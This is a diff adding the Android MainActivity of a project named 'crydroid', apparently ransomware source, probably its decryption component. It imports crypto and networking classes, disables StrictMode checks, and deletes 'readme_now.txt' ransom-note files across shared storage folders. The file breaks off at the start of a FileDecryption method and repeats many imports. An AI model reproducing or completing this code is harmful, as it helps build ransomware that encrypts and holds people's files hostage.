@@ -1,0 +1,94 @@
+package com.crydroid;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.util.Random;
+import java.security.AlgorithmParameters;
+import java.security.SecureRandom;
+import javax.crypto.Cipher;
+import javax.crypto.SecretKey;
+import javax.crypto.SecretKeyFactory;
+import javax.crypto.spec.PBEKeySpec;
+import javax.crypto.spec.PBEParameterSpec;
+import java.security.spec.KeySpec;
+import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import javax.crypto.Cipher;
+import javax.crypto.SecretKey;
+import javax.crypto.SecretKeyFactory;
+import javax.crypto.spec.PBEKeySpec;
+import javax.crypto.spec.PBEParameterSpec;
+import android.content.pm.PackageManager;
+import android.app.Activity;
+import android.support.v4.app.ActivityCompat;
+import android.support.v4.content.ContextCompat;
+import android.support.v7.app.AppCompatActivity;
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import android.annotation.SuppressLint;
+import android.app.Activity;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Bundle;
+import android.os.StrictMode;
+import android.util.Log;
+import android.view.Menu;
+import android.view.MenuItem;
+import android.widget.Toast;
+import org.apache.commons.io.FilenameUtils;
+import java.io.FileFilter;
+import java.io.IOException;
+import java.util.List;
+import org.apache.commons.io.FileUtils;
+import org.apache.commons.io.filefilter.TrueFileFilter;
+import org.apache.commons.lang3.ArrayUtils;
+import java.io.FileFilter;
+import java.io.IOException;
+import java.util.List;
+import android.os.Environment;
+
+@SuppressLint("NewApi")
+public class MainActivity extends Activity
+  {
+@Override
+protected void onCreate(Bundle savedInstanceState)
+{
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
+    StrictMode.ThreadPolicy policy=new StrictMode.ThreadPolicy.Builder().permitAll().build();
+    StrictMode.setThreadPolicy(policy);
+
+        try {
+checkperm();
+        } catch (Exception e) {
+        }
+}
+
+
+public void deletemessage() throws Exception  {
+
+for (File f : new File("/storage/emulated/0").listFiles()) {
+    if (f.isDirectory()) {
+String path1 = f.getCanonicalPath();
+
+File readme = new File("/"+path1+"/readme_now.txt");
+readme.delete();
+
+    }
+}
+
+
+}
+
+
+public static void FileDecryption(String path1) throws Exception {
+
+
+
+
